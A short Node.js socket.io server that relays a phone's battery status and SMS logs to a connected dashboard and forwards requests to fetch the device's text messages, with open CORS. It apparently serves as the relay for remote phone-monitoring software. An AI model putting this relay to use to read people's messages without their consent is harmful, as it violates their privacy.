const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    // Forward battery
    socket.on('battery-status', (data) => {
        socket.broadcast.emit('ui-battery', data);
    });

    // Handle SMS Request
    socket.on('get-sms-request', () => {
        socket.broadcast.emit('get-sms-request');
    });

    // Forward SMS Data
    socket.on('sms-data-log', (data) => {
        socket.broadcast.emit('ui-sms-display', data);
    });

    socket.on('disconnect', () => {
        socket.broadcast.emit('device-status', { online: false });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server Active on ${PORT}`));
